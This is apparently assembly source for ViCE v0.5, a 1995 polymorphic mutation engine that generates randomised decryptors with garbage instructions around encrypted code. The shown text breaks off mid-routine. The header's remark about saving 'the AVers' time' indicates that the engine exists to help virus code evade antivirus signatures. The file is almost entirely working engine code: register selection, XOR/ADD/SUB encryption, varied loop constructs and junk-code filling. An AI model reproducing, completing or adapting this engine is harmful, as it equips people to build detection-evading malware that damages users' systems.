;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;                       ûiCE v0.5, (c)1995 ûirogen
;
; **************************************************************************
; LICENSE: If you use this software you are required to pay me a billion
; dollars. If you cannot afford a billion dollars, then you must send me your
; first born. This code is pretty fucked up to follow, sorry.
; ***************************************************************************
;
;      CS:SI -> code to encrypt
;      CS:DI -> decryptor+encrypted code
;         CX = size of code
;         DX = offset decryptor will be run from
;         AL = bit 0=1-CS Override off
;              bit 1=1-garbage on, 0-garbage off
;
;   returns: CX=size of decryptor+code
;
; General Decryptor Map (this should save the AVers some time):
;
;     [mov_reg,ptr]          [mov_reg,cntr]
;     [mov_reg,cntr]    or   [mov_reg,ptr]
;     &| [xor ptr,val]  or   [mov h_reg,ptr]    or     [mov h_reg,key] -|
;     &| [add ptr,val]       &| [xor h_reg,val]     &| [xor ptr,h_reg] -|
;     &| [sub ptr,val]       &| [add h_reg,val]     &| [add ptr,h_reg] -|
;                            &| [sub h_reg,val]     &| [sub ptr,h_reg]
;                            [mov ptr,h_reg]
;     [inc_reg ptr]
;     [dec_reg cntr]
;     *[pushf]            - if garbage between dec_reg and loop construct
;      [popf]
;
;      [jz $+2]   or [jnz start] or [jns start] or [loop start] or [cmp cx,0]
;      [jmp start]     or                                      [loopnz start]
;                   [setup reg,start]
;                   [push reg]
;                   [ret]
;
;
;     setup_reg variations:
;      [zero_reg]
;      [add reg,val] or [sub reg,neg val]
;         or
;      [mov reg,val]
;
;     zero_reg variations:
;      [xor reg,reg]
;        or
;                      **[sub reg,reg]** removed in version 0.5
;      [mov reg,0]
;
;     dec_reg variations:
;      [dec reg]
;      [add reg,-1]
;      [add reg,-0001]
;      [sub reg,1]
;      [sub reg,0001]
;
;     inc_reg variations:
;      [inc reg]
;      [add reg,01]
;      [add reg,+0001]
;      [sub reg,-01]
;      [sub reg,-0001]
;
;   **all SUB AX and ADD AX operands use the short form.**
;
; Garbage Generation: Between each functional operand & before and after loop
;
;


segment     cseg
assume      cs:     cseg, es: cseg, ds: cseg, ss: cseg
org         0h

            global  _vice: proc

            proc    _vice
_al         equ     0                       ; our awesome 8 bit registers
_ah         equ     1
_bl         equ     2
_bh         equ     3
_cl         equ     4
_ch         equ     5
_dl         equ     6
_dh         equ     7
_ax         equ     0                       ; our tubular 16 bit registers
_bx         equ     1
_cx         equ     2
_dx         equ     3
_di         equ     4
_si         equ     5
_bp         equ     6
GRB_BEFORE  equ     650                     ; garbage before loop
GRB_BEFORE_PER equ  600                     ; max per call before loop
MAX_GRB     equ     127                     ; max garbage inside loop (<128)
MAX_PER     equ     20                      ; max garabge between each operand
                                            ; inside loop
MAX_JMP     equ     127                     ; max jump range, must be less than
                                            ; 128
;
;
;
            push    ax bp bx dx             ; preserve registers
            call    get_addr                ; grab relative offset
get_addr:   pop     bp
            sub     bp, offset $-1

            mov     cs: _ss[bp],ss          ; setup our neato stack
            mov     cs: _sp[bp],sp
            cli
            mov     bx,cs
            mov     ss,bx
            lea     sp,_stack[bp]
            sti

            mov     options[bp],al          ; save options byte
            mov     run_ofs[bp],dx          ; save run offset
            mov     beg_ofs[bp],di          ; save decryptor start pos

            mov     ran_byte[bp],0          ; no xor
            mov     ran_byte2[bp],0         ; no add
            mov     ran_byte3[bp],0         ; no sub
            mov     dec_reg[bp],0FFh        ; reset counter register
            mov     d_reg[bp],0FFh          ; reset 8bit cryption reg
            mov     push_reg[bp],0FFh       ; reset push/ret register
            mov     load_reg[bp],0FFh       ; reset load cryption reg
            mov     garbage_left[bp],GRB_BEFORE ; set garbage limit
            mov     max_per_call[bp],GRB_BEFORE_PER

            push    cx cx si di dx
            call    random_init             ; initialize random seed
            call    random_byte             ; grab a random byte

            call    fill_between            ; fill garbage

            test    dl,00000001b            ; pointer or counter first?
            jz      ptr_first
            call    setup_counter           ; setup counter register
            call    setup_ptr               ; setup pointer register
            jmp     cnt_first
ptr_first:
            call    setup_ptr               ; setup pointer register
            call    setup_counter           ; setup counter register
cnt_first:
            mov     loop_ofs[bp],di         ; save offset for loop
            mov     garbage_left[bp],MAX_GRB ; reset garbage left
            mov     max_per_call[bp],MAX_PER

            call    setup_crypt             ; setup cryptor
            mov     al, ptr_reg[bp]         ; get pointer register
            call    inc_register            ; setup increment pointer register
            call    setup_dec_and_loop      ; setup decrement counter and loop

            mov     ax,di                   ; ax=dec end
            pop     dx di
            push    ax                      ; save current decryptor pos [di]
            sub     ax,di                   ; start-end
            mov     bx,ax                   ; save cryptor length
            add     ax,dx                   ; ax=length+run ofs
            pop     di                      ; restore decryptor offset
            mov     si, ptr_ofs[bp]         ; set correct pointer value
            dec     si                      ; SUB SI,2
            dec     si
            mov     word ptr [si],ax        ; write value for pointer
            pop     si cx                   ; Restore code offset and length
            push    cx di                   ; save DI and CX
            rep     movsb                   ; copy code into buffer
            pop     si cx                   ; pop offset of copied code and len
            call    encrypt                 ; encrypt the fucker
            pop     cx                      ; pop code length
            add     cx,bx                   ; cx=decryptor size+code size
            cli
            mov     ss,cs: _ss[bp]
            mov     sp,cs: _sp[bp]
            sti
            pop     dx bx bp ax             ; restore registers
            ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Encryption Loop
;  Encrypts the code using a XOR,ADD,&|SUB method.
;   Call with: CX=code length
;              DS:SI=code to encrypt
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
encrypt:
            db      80h,2Ch                 ; byte XOR
ran_byte3   db      0
            db      80h,04h                 ; byte SUB
ran_byte2   db      0
            db      80h,34h                 ; byte ADD
ran_byte    db      0
            inc     si
            loop    encrypt                 ; loop
            ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Setup Counter Operand
;   This is the register that will be used for to keep track of the
;   loop. Can be AX,BX,CX, or DX.
;     Call with: CX=counter value
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
setup_counter:

            call    get_reg                 ; get register AX|BX|CX|DX
            mov     dec_reg[bp],al          ; save register
            mov     bl,0                    ; use word reg
            call    mov_register            ; mov register,XXXX
            call    fill_between            ; fill garbage
            ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Setup Pointer Operand
;   This is the register which points to the code being decrypted.
;   Can be DI,SI,or BP.
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
setup_ptr:
            mov     ax,_bp                  ; max register is _bp
            call    random                  ; get a random register
            cmp     dx,_di                  ; register must di,si, or bp?
            jl      setup_ptr               ; if not, then get another
            mov     al,dl                   ; save register
            mov     ah,0                    ; gonna move into a word
            mov     si,ax                   ; setup pointer to register str.
            mov     ah, xor_p_struct[bp+si] ; get direct XOR operand
            mov     xor_op[bp],ah
            mov     ah, add_p_struct[bp+si] ; get direct ADD operand
            mov     add_op[bp],ah
            mov     ah, sub_p_struct[bp+si] ; get direct SUB operand
            mov     sub_op[bp],ah
            mov     ptr_reg[bp],al          ; save pointer register
            push    cx
            xor     cx,cx                   ; set to 0 for now, fix later
            mov     bl,0                    ; use word register
            call    mov_register            ; mov 0 to register, update later
            pop     cx
            mov     ptr_ofs[bp],di          ; save offset of pointer calculation
                                            ; so we can write correct value
                                            ; later
            call    fill_between            ; fill garbage
            ret


;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; SETUP_DEC_AND_LOOP
;  This routine decrements the counter and creates the loop construct.
;
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
setup_dec_and_loop:
            call    random_byte             ; get random byte
            mov     al, dec_reg[bp]         ; get counter register
            cmp     al,_cx                  ; is cx?
            jnz     no_loop1                ; if not, then can't use LOOP/LOOPNZ
            test    dl,00000001b            ; use loop?
            jnz     no_loop1
            jmp     use_loop
no_loop1:
            call    dec_register            ; write code to decrement counter
            test    options[bp],00000010b   ; if garbage off, don't use pushf
            jz      no_pushf                ;
            cmp     dl,2                    ; use pushf?
            jz      no_pushf
            mov     byte ptr [di],9Ch       ; throw pushf
            inc     di
            call    fill_between            ; fill garbage
            mov     byte ptr [di],9Dh       ; throw popf
            inc     di
no_pushf:
            test    dl,00000010b            ; use push/ret method?
            jz      no_push_ret
            mov     byte ptr [di],74h       ; write JZ
            inc     di
            mov     jz_ofs[bp],di           ; save location of JZ offset
            inc     di
            call    fill_between            ; fill garbage
            call    get_reg                 ; get AX|BX|CX|DX that's not counter
            mov     push_reg[bp],al
            mov     cx, loop_ofs[bp]        ; get loop offset
            mov     bx, beg_ofs[bp]         ; get decryptor start
            sub     cx,bx                   ; start-where_2_loop=offset (org 0)
            add     cx, run_ofs[bp]         ; add decryptor run offset
            push    ax
            mov     bl,0                    ; use word register
            call    mov_register            ; setup register for push
            pop     ax
            call    fill_between            ; fill garbage
            mov     ah,0
            mov     si,ax
            mov     dh, push_struct[bp+si]  ; get push operand
            mov     [di],dh                 ; write it..
            inc     di
            call    fill_between            ; fill garbage
            mov     byte ptr [di],0C3h      ; write return
            inc     di
            mov     push_reg[bp],0FFh
            call    fill_between
            mov     ax,di                   ; di=offset at end of decryptor
            dec     ax                      ; -1
            mov     si, jz_ofs[bp]          ; get address of jz offset
            sub     ax,si                   ; subtract current from jz offset
            mov     byte ptr [si],al        ; save claculated relative offset
            jmp     created
no_push_ret:
            test    dl,00000100b            ; use JZ/JMP?
            jz      no_jz_jmp
            mov     word ptr [di],0274h     ; write JZ $+2
            inc     di
            inc     di
            mov     byte ptr [di],0EBh      ; write JMP
            jmp     no_loop
no_jz_jmp:
            test    dl,00001000b            ; use JNZ?
            jz      use_jns
            mov     byte ptr [di],75h       ; Write JNZ
            jmp     use_jnz
use_jns:
            mov     byte ptr [di],79h       ; Write JNS
use_jnz:
            jmp     no_loop
use_loop:
            test    dl,00010000b            ; use LOOP or LOOPNZ?
            jz      use_loopnz
            mov     byte ptr [di],0E2h      ; write LOOP
            jmp     no_loop
use_loopnz:
            mov     word ptr [di],0F983h    ; write CMP CX,XXXX
            inc     di
            inc     di
            mov     byte ptr [di],0         ; write 0
            inc     di
            mov     byte ptr [di],0E0h      ; write LOOPNZ
no_loop:
            mov     ax, loop_ofs[bp]        ; get offset to loop to
            dec     ax
            dec     ax
            mov     bx,di                   ; bx=loop operand offset
            sub     bx,ax                   ; get difference
            neg     bx                      ; negate - negative jmp
            inc     di
            mov     byte ptr [di],bl        ; save it
            inc     di
            call    fill_between            ; fill garbage
created:
            ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;ZERO_REGISTER
;  Generates an operand which nulls a register
;   Call with: AL=word register
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
zero_register:
            push    dx ax ax
            call    random_byte             ; grab a random byte
            pop     ax
            mov     ah,0
            mov     si,ax                   ; setup pointer
            test    dl,00000001b            ; use mov?
            jnz     use_cmov
            mov     ah,zero_struct[bp+si]   ; get operand
            mov     al,31h                  ; write XOR reg,reg
            mov     word ptr [di],ax        ; write operand
            jmp     done_zero
use_cmov:
            mov     ah,mov_struct[bp+si]
            mov     byte ptr [di],ah
            inc     di
            mov     word ptr [di],0
done_zero:
            inc     di
            inc     di
            call    fill_between            ; fill garbage
            pop     ax dx
            ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Setup_Crypt
;  Generates encryption operand(s).
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
setup_crypt:
            push    dx ax
            call    random_byte             ; grab a random byte
            pop     ax
            mov     dh,dl                   ; save for a cryption #
            test    dl,00000100b            ; use subtract?
            jz      no_xsub
            mov     ran_byte2[bp],dl        ; set subtract..
no_xsub:
            test    dl,00000010b            ; use add?
            jz      no_xadd
            shl     dh,1
            mov     ran_byte3[bp],dh        ; set add..
no_xadd:
            test    dl,00000001b            ; use xor?
            jz      no_xxor
            xor     dh,87h
            mov     ran_byte[bp],dh         ; set xor
no_xxor:
            call    chk_ran                 ; verify that it's not a null cryptor
            test    dl,00001000b            ; use xor,reg?
            jz      use_xor_ptr_reg
            test    dl,00010000b            ; use direct,val?
            jz      use_direct

use_load:   call    load_reg_crypt          ; use indirect
            jmp     xor_done
use_direct:
            mov     dl, ran_byte[bp]        ; using XOR?
            or      dl,dl
            jz      no_dxor
            mov     al, xor_op[bp]          ; get xor operand
            call    write_direct            ; write operand
no_dxor:
            mov     dl, ran_byte2[bp]       ; using SUB?
            or      dl,dl
            jz      no_dsub
            mov     al, sub_op[bp]          ; get sub operand
            call    write_direct            ; write operand
no_dsub:
            mov     dl, ran_byte3[bp]       ; using ADD?
            or      dl,dl
            jz      xor_done
            mov     al, add_op[bp]          ; get add operand
            call    write_direct            ; write operand
            jmp     xor_done
use_xor_ptr_reg:
            cmp     ptr_reg[bp],_bp         ; can't use this method with BP
            jz      use_load
get_xor_ptr_reg:
            mov     ax,_dh
            call    ran_ptr                 ; get byte register in SI
            mov     dh,dl                   ; dx=si on return
            mov     d_reg[bp],dh            ; save register we're using
            mov     dl,dec_reg[bp]          ; get counter register
            call    test_half               ; verify no conflict with counter
            jz      get_xor_ptr_reg
            mov     cl,ran_byte[bp]         ; get XOR number
            or      cl,cl                   ; does it exist?
            jz      no_rxor                 ; if not, then skip XOR
            mov     al,30h                  ; 30h=XOR Operand
            call    write_xor_ptr_reg       ; write operands
no_rxor:
            mov     cl,ran_byte2[bp]        ; get SUB number
            or      cl,cl                   ; does it exist?
            jz      no_rsub                 ; if not, then skip SUB
            mov     al,28h                  ; 28h=SUB Operand
            call    write_xor_ptr_reg       ; write operands
no_rsub:
            mov     cl,ran_byte3[bp]        ; get ADD number
            or      cl,cl                   ; does it exist?
            jz      xor_done                ; if not, the skip ADD
            mov     al,0                    ; 0=ADD Operand
            call    write_xor_ptr_reg       ; write operands
xor_done:
            pop     dx
            mov     d_reg[bp],0FFh          ; safe to use register in garbage
            ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Write_xor_ptr_reg:
;   Writes operands to load a register with a key and encrypt with it.
;   Call with:
;    al=encryption operand
;    cl=encryption key
;    si=ptr to byte register to use
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
write_xor_ptr_reg:
            push    ax                      ; save encryption op
            mov     ax,si                   ; ax=byte register
            push    si                      ; save byte register
            mov     bl,1                    ; use byte
            call    mov_register            ; generate mov byte_reg,XX
            call    fill_between            ; fill garbage
            pop     si ax                   ; restore byte register & encryption op
            call    put_cs                  ; write CS: segment override
            mov     ah,xor_ptr_reg_struct[bp+si] ; get rest of encryption op
            cmp     ptr_reg[bp],_di         ; is pointer DI or SI?
            jnz     xor_si_reg              ; if SI then jump
            inc     ah                      ; if DI then increment operand
xor_si_reg:
            mov     word ptr [di],ax        ; write encryption operand
            inc     di                      ; ADD DI,2
            inc     di
            call    fill_between            ; fill garbage
            ret


;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Write direct crypt operand
;  al=encryption operand
;  dl=key
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
write_direct:
            call    put_cs                  ; throw segment override
            mov     byte ptr [di],80h       ; all of 'em bez 80h
            inc     di
            mov     byte ptr [di],al        ; write cryptor type/ptr
            inc     di
            call    throw_bp                ; if using BP, add a 0
            mov     byte ptr [di],dl        ; write crypt number
            inc     di
            call    fill_between            ; fill garbage
            ret


;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Load_reg_crypt
;  Write operands to load a byte register from pointer and encrypt.
;
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
load_reg_crypt:
            push    dx
if_bad:
            mov     ax,_dh
            call    random                  ; get a half register
            mov     ah, dec_reg[bp]         ; load counter register
            add     ah,ah
            cmp     dl,ah                   ; can't be high or low of counter
            jz      if_bad
            inc     ah
            cmp     dl,ah                   ; check
            jz      if_bad
            mov     load_reg[bp],dl
            mov     dh,0
            mov     si,dx
            cmp     ptr_reg[bp],_bp         ; using bp?
            jnz     tis_sidi
            mov     dh, lp_bp_struct[bp+si] ; yea.. load operand from BP structure
            jmp     was_bp
tis_sidi:
            mov     dh, lp_struct[bp+si]    ; get operand from normal structure
was_bp:
            mov     al,88h                  ; save
            mov     dl,8Ah                  ; load
            cmp     ptr_reg[bp],_si         ; is si ptr?
            jnz     isn_si
            dec     dh                      ; if so, decrement operand
isn_si:
            mov     ah,dh
            call    put_cs                  ; throw segment override
            mov     word ptr [di],dx        ; write load operand
            inc     di
            inc     di
            call    throw_bp                ; if BP, then add a 0
            call    fill_between            ; gill garbage
            mov     cl, ran_byte[bp]
            or      cl,cl                   ; using XOR?
            jz      no_xor
            mov     dh, xor_h_struct[bp+si] ; get op
            call    write_reg_crypt         ; write op
no_xor:
            mov     cl, ran_byte2[bp]
            or      cl,cl                   ; using SUB?
            jz      no_sub
            mov     dh, sub_h_struct[bp+si] ; get op
            call    write_reg_crypt         ; write op
no_sub:
            mov     cl, ran_byte3[bp]
            or      cl,cl                   ; using ADD?
            jz      no_add
            mov     dh, add_h_struct[bp+si] ; get op
            call    write_reg_crypt         ; write op
no_add:
            call    put_cs                  ; throw segment override
            mov     word ptr [di],ax        ; write save operand
            inc     di
            inc     di
            call    throw_bp                ; if bp then throw in a 0
            mov     load_reg[bp],0FFh
            call    fill_between            ; fill garbage
            pop     dx
            ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Write crypt operand of register technique
;  dh=low byte of operand
;  cl=crypt number
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
write_reg_crypt:
            mov     dl,80h                  ; starts with 80h
            mov     word ptr [di],dx        ; write op
            inc     di
            inc     di
            mov     byte ptr [di],cl        ; write crypt num
            inc     di
            call    fill_between            ; fill garbage
            ret
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Prevent null cryptors
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
chk_ran:
            cmp     ran_byte[bp],0          ; using XOR?
            jnz     is_one
            cmp     ran_byte2[bp],0         ; using SUB?
            jnz     is_one
            cmp     ran_byte3[bp],0         ; using ADD?
            jnz     is_one
            push    ax
            call    random_byte             ; if not using any..
            pop     ax
            mov     ran_byte2[bp],dl        ; then default to SUB
is_one:
            ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Writes an extra 0 to an op if using BP pointer
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
throw_bp:
            cmp     ptr_reg[bp],_bp
            jnz     not2_bp
            mov     byte ptr [di],0
            inc     di
not2_bp:
            ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Get a register, AX|BX|CX|DX
;  ret: AL=register
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
get_reg:
            push    dx
bad_reg:
            mov     ax,_dx                  ; max is DX
            call    random                  ; get random register
            mov     al,dl
            cmp     al, dec_reg[bp]         ; is it the counter register?
            jz      bad_reg                 ; can't use that..
            cmp     al, push_reg[bp]        ; can't use register in PUSH/RET
            jz      bad_reg
            mov     dh, load_reg[bp]
            call    test_half               ; test if conflicts with an 8 bit
                                            ; register used in cryption
            jz      bad_reg                 ; if so, get another register
            mov     dl,al                   ; test if conflicts
            mov     dh, d_reg[bp]           ; with key register in cryption
            call    test_half
            jz      bad_reg                 ; if so get another register
            pop     dx
            ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; test_half - tests to see if an 8bit register is the high or low of
;             a 16 bit register.
; call with: dl=16 bit register
;            dh=8 bit register
; ret: if zero then are bad
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
test_half:
            add     dl,dl                   ; double pointer
            cmp     dl,dh                   ; conflict?
            jz      z_ret
            inc     dl
            cmp     dl,dh                   ; conflict?
z_ret:      ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Write 'CS:' 02Eh Segment Override
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
put_cs:
            test    cs: options[bp],00000001b ;  on?
            jnz     no_seg
            mov     byte ptr [di],02Eh      ; write segment override
            inc     di
no_seg:     ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Generate Code To Increment A Register
; AL=register
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
inc_register:

            push    dx ax
            mov     ax,5
            call    random                  ; grab random byte
            pop     ax

            mov     ah,0
            mov     si,ax
            cmp     dl,1                    ; use byte ADD reg,+1?
            jz      use_add_1
            cmp     dl,2                    ; use byte SUB reg,-1?
            jz      use_sub_n1
            cmp     dl,3                    ; use word ADD reg,+1?
            jz      use_word_add_1
            cmp     dl,4                    ; use word SUB reg,-1?
            jz      use_word_sub_n1
            mov     dl, inc_p_struct[bp+si] ; default to using INC reg
            mov     byte ptr [di],dl        ; save operand
            inc     di
            jmp     inc_done                ; done ..
use_sub_n1:
            mov     dh, byte_sub_struct[bp+si] ; get operand
            mov     ah,0FFh                 ; value is -1
            call    byte_add_sub            ; write operand
            jmp     inc_done
use_add_1:
            mov     dh, byte_add_struct[bp+si] ; get operand
            mov     ah,1                    ; value is 1
            call    byte_add_sub            ; write operand
            jmp     inc_done
use_word_add_1:
            mov     cx,1                    ; value is 1
            call    add_reg_val             ; write add operand
            jmp     inc_done
use_word_sub_n1:
            mov     cx,1                    ; value is -1 (is inversed)
            call    sub_reg_val             ; write subtract operand
inc_done:
            call    fill_between            ; fill garbage
            pop     dx
            ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Write byte SUB / ADD reg, value of ah
;  dh=add or sub reg
;  ah=value
